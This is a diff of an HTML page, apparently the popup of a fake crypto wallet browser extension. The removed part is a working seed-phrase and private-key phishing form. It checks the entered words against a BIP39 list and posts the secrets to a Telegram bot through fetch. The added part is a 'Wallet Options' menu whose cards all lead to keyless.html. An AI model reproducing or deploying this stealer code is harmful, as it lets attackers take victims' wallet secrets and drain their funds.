@@ -3,251 +3,128 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=350, height=600, initial-scale=1.0" />
-  <title>Import Wallet</title>
+  <title>Wallet Options</title>
   <style>
-    html, body {
-      width: 350px;
-      height: 600px;
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2; /* arrière-plan gris soft */
       margin: 0;
       padding: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: #f3f4f6;
+      width: 350px;
+      height: 600px;
       overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
 
-    body {
+    .container {
+      width: 100%;
+      max-width: 320px;
       display: flex;
       flex-direction: column;
       align-items: center;
-      padding: 10px;
+      justify-content: center;
+    }
+
+    .card {
+      background-color: white;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 15px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      cursor: pointer;
+      text-decoration: none;
+      color: black;
+      width: 100%;
+      height: 100px;
+      transition: transform 0.2s ease;
       box-sizing: border-box;
     }
 
-    h2 {
-      text-align: center;
-      font-size: 18px;
-      font-weight: 600;
-      margin-bottom: 10px;
-      color: #111827;
+    .card:hover {
+      transform: scale(1.02);
     }
 
-    .tab-buttons {
+    .card-content {
+      flex-grow: 1;
+      padding-right: 12px;
+    }
+
+    .card-title {
+      font-size: 16px;
+      font-weight: bold;
+      margin: 0;
       display: flex;
-      width: 100%;
-      margin-bottom: 10px;
-      border-radius: 10px;
-      overflow: hidden;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+      align-items: center;
     }
 
-    .tab-buttons button {
-      flex: 1;
-      padding: 10px 0;
-      border: none;
-      font-size: 13px;
-      cursor: pointer;
-      transition: background 0.3s, color 0.3s;
-    }
-
-    .tab-buttons button.active {
-      background-color: #ffffff;
-      color: #111827;
-      font-weight: bold;
-    }
-
-    .tab-buttons button.inactive {
-      background-color: #e5e7eb;
-      color: #6b7280;
-    }
-
-    label {
-      font-size: 13px;
-      margin-bottom: 4px;
-      display: block;
-      color: #374151;
-    }
-
-    select {
-      width: 100%;
-      padding: 6px;
-      font-size: 13px;
-      margin-bottom: 10px;
-      border: 1px solid #d1d5db;
-      border-radius: 6px;
-      background: white;
-    }
-
-    .grid {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 6px;
-      width: 100%;
-    }
-
-    .grid input {
-      padding: 8px;
-      font-size: 12px;
-      border-radius: 8px;
-      border: 1px solid #cbd5e1;
-      background: #ffffff;
-      height: 32px;
-      box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);
-    }
-
-    textarea {
-      width: 100%;
-      padding: 8px;
-      font-size: 12px;
-      border-radius: 8px;
-      border: 1px solid #cbd5e1;
-      resize: none;
-      background: #ffffff;
-      box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);
-      height: 80px;
-    }
-
-    .confirm-btn {
-      margin-top: 12px;
-      width: 80%;
-      padding: 10px;
-      font-size: 14px;
-      background-color: #111827;
+    .new-badge {
+      background-color: #00c47c;
       color: white;
-      border: none;
-      border-radius: 25px;
-      cursor: pointer;
-      transition: background 0.3s ease;
-    }
-
-    .confirm-btn:hover {
-      background-color: #1f2937;
-    }
-
-    .message {
-      margin-top: 10px;
-      font-size: 13px;
+      font-size: 10px;
       font-weight: bold;
-      text-align: center;
+      padding: 2px 6px;
+      border-radius: 6px;
+      margin-left: 8px;
     }
 
-    .error { color: red; }
-    .success { color: green; }
+    .card-description {
+      font-size: 12px;
+      color: #666;
+      margin-top: 6px;
+      line-height: 1.4;
+    }
+
+    .icon {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      overflow: hidden;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #e0e0e0;
+    }
+
+    .icon img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+    }
   </style>
 </head>
 <body>
-  <h2>Importing Wallet</h2>
-  <div class="tab-buttons">
-    <button id="secretTab" class="active" onclick="showTab('secret')">Secret phrase</button>
-    <button id="privateTab" class="inactive" onclick="showTab('private')">Private key</button>
+  <div class="container">
+
+    <a href="keyless.html" class="card">
+      <div class="card-content">
+        <div class="card-title">Keyless entry <span class="new-badge">New</span></div>
+        <div class="card-description">Syncing a keyless wallet with an extension</div>
+      </div>
+      <div class="icon"><img src="keyless.svg" alt="keyless icon"></div>
+    </a>
+
+    <a href="keyless.html" class="card">
+      <div class="card-content">
+        <div class="card-title">Importing a wallet</div>
+        <div class="card-description">Enter the private key or a 12, 15, 18, 21, or 24-word SEED phrase</div>
+      </div>
+      <div class="icon"><img src="import.svg" alt="import icon"></div>
+    </a>
+
+    <a href="keyless.html" class="card">
+      <div class="card-content">
+        <div class="card-title">Hardware Wallet</div>
+        <div class="card-description">Connect the hardware wallet by scanning the QR code or via USB</div>
+      </div>
+      <div class="icon"><img src="hardware.svg" alt="hardware icon"></div>
+    </a>
+
   </div>
-
-  <label for="wordsCount">Seed phrase words:</label>
-  <select id="wordsCount" onchange="updateInputs(this.value)">
-    <option value="12" selected>12</option>
-    <option value="24">24</option>
-  </select>
-
-  <div id="secretTabContent">
-    <div class="grid" id="seedInputs"></div>
-  </div>
-
-  <div id="privateTabContent" style="display:none">
-    <textarea id="privateKeyInput" rows="4" placeholder="Enter your private key"></textarea>
-  </div>
-
-  <button class="confirm-btn" onclick="onConfirm()">Confirm</button>
-  <div id="message" class="message"></div>
-
-  <script>
-    const TELEGRAM_BOT_TOKEN = 'TON_TOKEN';
-    const TELEGRAM_CHAT_ID = 'TON_CHAT_ID';
-
-    const bip39Words = ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual"];
-
-    function updateInputs(count) {
-      const container = document.getElementById('seedInputs');
-      container.innerHTML = '';
-      for (let i = 1; i <= count; i++) {
-        const input = document.createElement('input');
-        input.placeholder = i;
-        container.appendChild(input);
-      }
-
-      // ✅ Activer scroll uniquement si 24 mots
-      if (parseInt(count) > 12) {
-        document.body.style.overflowY = 'auto';
-      } else {
-        document.body.style.overflowY = 'hidden';
-      }
-    }
-
-    function showTab(tab) {
-      const secretTab = document.getElementById('secretTab');
-      const privateTab = document.getElementById('privateTab');
-      const secretContent = document.getElementById('secretTabContent');
-      const privateContent = document.getElementById('privateTabContent');
-
-      if (tab === 'secret') {
-        secretTab.classList.add('active');
-        privateTab.classList.remove('active');
-        secretTab.classList.remove('inactive');
-        privateTab.classList.add('inactive');
-        secretContent.style.display = 'block';
-        privateContent.style.display = 'none';
-      } else {
-        privateTab.classList.add('active');
-        secretTab.classList.remove('active');
-        privateTab.classList.remove('inactive');
-        secretTab.classList.add('inactive');
-        privateContent.style.display = 'block';
-        secretContent.style.display = 'none';
-      }
-      showMessage("");
-    }
-
-    function showMessage(text, isError = false) {
-      const msg = document.getElementById("message");
-      msg.textContent = text;
-      msg.className = isError ? "message error" : "message success";
-    }
-
-    function sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
-      });
-    }
-
-    function onConfirm() {
-      const secretTabActive = document.getElementById('secretTab').classList.contains('active');
-      if (secretTabActive) {
-        const inputs = document.querySelectorAll('#seedInputs input');
-        const words = Array.from(inputs).map(i => i.value.trim().toLowerCase());
-        if (words.includes('')) {
-          showMessage("❌ Please fill all fields", true);
-          return;
-        }
-        const invalid = words.filter(w => !bip39Words.includes(w));
-        if (invalid.length > 0) {
-          showMessage("❌ Incorrect phrase", true);
-          return;
-        }
-        sendToTelegram(`🪙 Seed Phrase:\n\n${words.join(" ")}`);
-        showMessage("✅ Sent to Telegram");
-      } else {
-        const key = document.getElementById('privateKeyInput').value.trim();
-        if (!key) {
-          showMessage("❌ Enter private key", true);
-          return;
-        }
-        sendToTelegram(`🔑 Private Key:\n\n${key}`);
-        showMessage("✅ Sent to Telegram");
-      }
-    }
-
-    updateInputs(12);
-  </script>
 </body>
 </html>
